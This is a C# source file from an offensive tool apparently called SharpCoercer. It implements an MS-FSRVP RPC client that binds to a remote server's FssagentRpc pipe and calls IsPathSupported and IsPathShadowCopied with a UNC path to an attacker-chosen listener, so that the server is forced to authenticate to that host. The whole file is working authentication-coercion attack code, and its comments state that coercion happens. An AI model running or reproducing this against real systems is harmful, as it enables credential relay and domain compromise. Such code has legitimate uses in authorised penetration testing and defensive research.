using SharpCoercer.Abstracts;
using SharpCoercer.Helpers;
using SharpCoercer.Win32;
using SharpCoercer.Win32.Structs;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace SharpCoercer.RpcClients
{
    internal class FsrvRpcClient : RpcClientBase, IRpcClient
    {
        //procedure format string for x64 architecture
        byte[] MIDL_ProcFormatStringx64 = new byte[] {
    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x40, 0x00, 0x44, 0x03, 0x0A, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x21,
    0x08, 0x00, 0x08, 0x00, 0x50, 0x21, 0x10, 0x00, 0x08, 0x00, 0x70, 0x00, 0x18, 0x00, 0x08, 0x00,
    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x18, 0x00, 0x32, 0x00, 0x00, 0x00, 0x08, 0x00,
    0x08, 0x00, 0x44, 0x02, 0x0A, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00,
    0x08, 0x00, 0x08, 0x00, 0x70, 0x00, 0x10, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00,
    0x02, 0x00, 0x20, 0x00, 0x32, 0x00, 0x00, 0x00, 0x44, 0x00, 0x4C, 0x00, 0x44, 0x03, 0x0A, 0x81,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0A, 0x01, 0x08, 0x00, 0x10, 0x00, 0x12, 0x41,
    0x10, 0x00, 0x10, 0x00, 0x70, 0x00, 0x18, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00,
    0x03, 0x00, 0x30, 0x00, 0x32, 0x00, 0x00, 0x00, 0x88, 0x00, 0x4C, 0x00, 0x46, 0x05, 0x0A, 0x81,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0A, 0x01, 0x08, 0x00, 0x10, 0x00, 0x0A, 0x01,
    0x10, 0x00, 0x10, 0x00, 0x0B, 0x01, 0x18, 0x00, 0x22, 0x00, 0x12, 0x41, 0x20, 0x00, 0x10, 0x00,
    0x70, 0x00, 0x28, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x20, 0x00,
    0x32, 0x00, 0x00, 0x00, 0x4C, 0x00, 0x08, 0x00, 0x44, 0x03, 0x0A, 0x81, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x0A, 0x01, 0x08, 0x00, 0x10, 0x00, 0x48, 0x00, 0x10, 0x00, 0x08, 0x00,
    0x70, 0x00, 0x18, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x20, 0x00,
    0x32, 0x00, 0x00, 0x00, 0x4C, 0x00, 0x08, 0x00, 0x44, 0x03, 0x0A, 0x81, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x0A, 0x01, 0x08, 0x00, 0x10, 0x00, 0x48, 0x00, 0x10, 0x00, 0x08, 0x00,
    0x70, 0x00, 0x18, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x18, 0x00,
    0x32, 0x00, 0x00, 0x00, 0x44, 0x00, 0x08, 0x00, 0x44, 0x02, 0x0A, 0x81, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x0A, 0x01, 0x08, 0x00, 0x10, 0x00, 0x70, 0x00, 0x10, 0x00, 0x08, 0x00,
    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x18, 0x00, 0x32, 0x00, 0x00, 0x00, 0x44, 0x00,
    0x08, 0x00, 0x44, 0x02, 0x0A, 0x81, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0A, 0x01,
    0x08, 0x00, 0x10, 0x00, 0x70, 0x00, 0x10, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00,
    0x08, 0x00, 0x28, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x24, 0x00, 0x47, 0x04, 0x0A, 0x01,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0B, 0x01, 0x08, 0x00, 0x22, 0x00, 0x50, 0x21,
    0x10, 0x00, 0x08, 0x00, 0x13, 0x20, 0x18, 0x00, 0x24, 0x00, 0x70, 0x00, 0x20, 0x00, 0x08, 0x00,
    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x28, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x40, 0x00, 0x46, 0x04, 0x0A, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0B, 0x01,
    0x08, 0x00, 0x22, 0x00, 0x50, 0x21, 0x10, 0x00, 0x08, 0x00, 0x50, 0x21, 0x18, 0x00, 0x08, 0x00,
    0x70, 0x00, 0x20, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x38, 0x00,
    0x32, 0x00, 0x00, 0x00, 0x90, 0x00, 0x08, 0x00, 0x47, 0x06, 0x0A, 0x83, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x0A, 0x01, 0x08, 0x00, 0x10, 0x00, 0x0A, 0x01, 0x10, 0x00, 0x10, 0x00,
    0x0B, 0x01, 0x18, 0x00, 0x22, 0x00, 0x48, 0x00, 0x20, 0x00, 0x08, 0x00, 0x13, 0x21, 0x28, 0x00,
    0x30, 0x00, 0x70, 0x00, 0x30, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x0B, 0x00,
    0x28, 0x00, 0x32, 0x00, 0x00, 0x00, 0x88, 0x00, 0x08, 0x00, 0x46, 0x04, 0x0A, 0x81, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0A, 0x01, 0x08, 0x00, 0x10, 0x00, 0x0A, 0x01, 0x10, 0x00,
    0x10, 0x00, 0x0B, 0x01, 0x18, 0x00, 0x22, 0x00, 0x70, 0x00, 0x20, 0x00, 0x08, 0x00, 0x00, 0x48,
    0x00, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x20, 0x00, 0x32, 0x00, 0x00, 0x00, 0x4C, 0x00, 0x08, 0x00,
    0x44, 0x03, 0x0A, 0x81, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0A, 0x01, 0x08, 0x00,
    0x10, 0x00, 0x48, 0x00, 0x10, 0x00, 0x08, 0x00, 0x70, 0x00, 0x18, 0x00, 0x08, 0x00, 0x00,
};

        //type format string for x64 architecture
        byte[] MIDL_TypeFormatStringx64 = new byte[] {
    0x00, 0x00, 0x11, 0x0C, 0x08, 0x5C, 0x11, 0x00, 0x08, 0x00, 0x1D, 0x00, 0x08, 0x00, 0x01, 0x5B,
    0x15, 0x03, 0x10, 0x00, 0x08, 0x06, 0x06, 0x4C, 0x00, 0xF1, 0xFF, 0x5B, 0x11, 0x04, 0xF2, 0xFF,
    0x11, 0x08, 0x25, 0x5C, 0x11, 0x14, 0x02, 0x00, 0x12, 0x08, 0x25, 0x5C, 0x11, 0x04, 0x02, 0x00,
    0x2B, 0x09, 0x29, 0x00, 0x20, 0x00, 0x01, 0x00, 0x02, 0x00, 0x08, 0x00, 0x01, 0x30, 0x01, 0x00,
    0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x12, 0x00, 0x02, 0x00, 0x1A, 0x07, 0x38, 0x00, 0x00, 0x00,
    0x0E, 0x00, 0x4C, 0x00, 0xBC, 0xFF, 0x4C, 0x00, 0xB8, 0xFF, 0x36, 0x36, 0x0B, 0x5B, 0x12, 0x08,
    0x25, 0x5C, 0x12, 0x08, 0x25, 0x5C, 0x00,};


        public bool HttpCoerce => false;

        public string Name => "MS-FSRVP";

        public string Description => "The File Server Remote VSS Protocol (FSRVP) is an RPC-based service for creating application-consistent shadow copies of remote file shares.";

        public FsrvRpcClient()
        {
            _interfaceId = new Guid("a8e0653c-2744-4389-a61d-7373df8b2292");
            _pipeName = "\\pipe\\FssagentRpc";
            BuildStub(_interfaceId, MIDL_TypeFormatStringx64, MIDL_ProcFormatStringx64, _pipeName, 1, 0);
        }
  
        private void BuildStub(Guid interfaceId, byte[] typeFormatx64, byte[] procFormatx64, string pipe, ushort MajorVerson, ushort MinorVersion)
        {

            _midl_procFromat = procFormatx64;
            _midl_typeFromat = typeFormatx64;
            // Initialize the RPC client interface and stub descriptor
            RpcClientInterface clientinterfaceObject = new RpcClientInterface(interfaceId, MajorVerson, MinorVersion);

            var clientinterface = GCHandle.Alloc(clientinterfaceObject, GCHandleType.Pinned);
            var typeformat = GCHandle.Alloc(typeFormatx64, GCHandleType.Pinned);

            // Allocate the stub descriptor with the necessary function pointers
            MidlStubDesc stubObject = new MidlStubDesc(typeformat.AddrOfPinnedObject(),
                                                        clientinterface.AddrOfPinnedObject(),
                                                        Marshal.GetFunctionPointerForDelegate(AllocateMemoryDelegate),
                                                        Marshal.GetFunctionPointerForDelegate(FreeMemoryDelegate),
                                                        IntPtr.Zero, 0x8010274);

            stub = GCHandle.Alloc(stubObject, GCHandleType.Pinned);

            _pipeName = pipe;
        }

   
        public IntPtr Bind( IntPtr hServer)
        {
            string remoteComputer = Marshal.PtrToStringUni(hServer);


            Console.WriteLine("Binding to " + remoteComputer + " " + _pipeName);

            // Bind to the FSS Agent RPC interface on the remote computer
            IntPtr sb = IntPtr.Zero;
            int status = Rpcrt4.RpcStringBindingCompose(
                null, "ncacn_np", remoteComputer, _pipeName, null, out sb);
            if (status != 0 || sb == IntPtr.Zero)
            {
                Console.WriteLine($"[x] RpcStringBindingComposeW failed: 0x{status:X8}");
                return IntPtr.Zero;
            }

            // Convert sb to string if you like:
            // string bindingStr = ;

            IntPtr binding = IntPtr.Zero;
            status = Rpcrt4.RpcBindingFromStringBinding(Marshal.PtrToStringUni(sb), out binding);
            if (status != 0 || binding == IntPtr.Zero)
            {
                Console.WriteLine($"[x] RpcBindingFromStringBindingW failed: 0x{status:X8}");
                return IntPtr.Zero;
            }

            string spn = $"cifs/{remoteComputer}";

            AuthenticateRpcBinding(binding, spn);

            if (status != 0)
            {
                Console.WriteLine($"[x] RpcBindingSetAuthInfo failed: 0x{status:X8}");
                Rpcrt4.RpcBindingFree(ref binding);
                return IntPtr.Zero;
            }

            Console.WriteLine("binding ok (handle=" + binding + ")");
            return binding;
        }


        public string BuildURL(string listener, int smbport = 445, int httpport = 80, bool isHttp = false)
        {

            //if http is used 
            if (isHttp)
                return $"\\\\{listener}@{httpport}/NETLOGON\\NETLOGON\\file.txt";



            //if default smb port is used
            if (smbport == 445)
                return $"\\\\{listener}\\NETLOGON\\settings.ini";


            //Return the URL for the SMB share with a specific port
            return $"\\\\{listener}@{smbport}\\NETLOGON\\settings.ini";
        }

   
        public int IsPathSupported(IntPtr hBind, string target, string url)
        {
            IntPtr resultPtr = IntPtr.Zero;
            try
            {
              
                // Callinfthe RPC method to check if the path is supported
                //and coercion happend
                resultPtr = Rpcrt4.NdrClientCall2(
                       stub.AddrOfPinnedObject(), // RPC binding handle
                        GetProcStringHandle(378), // Pointer to the format string
                        hBind, // Binding handle again (as per your example)
                        url        // The path parameter
                        ,
                        out _,
                        out _
             );
            }
            catch (SEHException)
            {
                int err = Marshal.GetExceptionCode();
                Trace.WriteLine("[x]IsPathSupported failed: " + err);
                return err;
            }

            return (int)resultPtr.ToInt64();
        }


        public int IsPathShadowCopied(IntPtr hBind, string target, string url)
        {
            IntPtr resultPtr = IntPtr.Zero;
            try
            {
         

                // Callinfthe RPC method to check if the path is supported
                //and coercion happend
                resultPtr = Rpcrt4.NdrClientCall2(
                       stub.AddrOfPinnedObject(), // RPC binding handle
                        GetProcStringHandle(432), // Pointer to the format string
                        hBind, // Binding handle again (as per your example)
                        url        // The path parameter
                        ,
                        out _,
                        out _
             );
            }
            catch (SEHException)
            {
                int err = Marshal.GetExceptionCode();
                Trace.WriteLine("[x]IsPathShadowCopied failed: " + err);
                return err;
            }

            return (int)resultPtr.ToInt64();
        }

    
        public CoerceFunction[] GetFunctions()
        {
            return new CoerceFunction[]
            {
                new CoerceFunction(this,IsPathSupported,nameof(IsPathSupported),BuildURL),
                new CoerceFunction(this,IsPathShadowCopied,nameof(IsPathShadowCopied),BuildURL),
            };
        }
    }
}
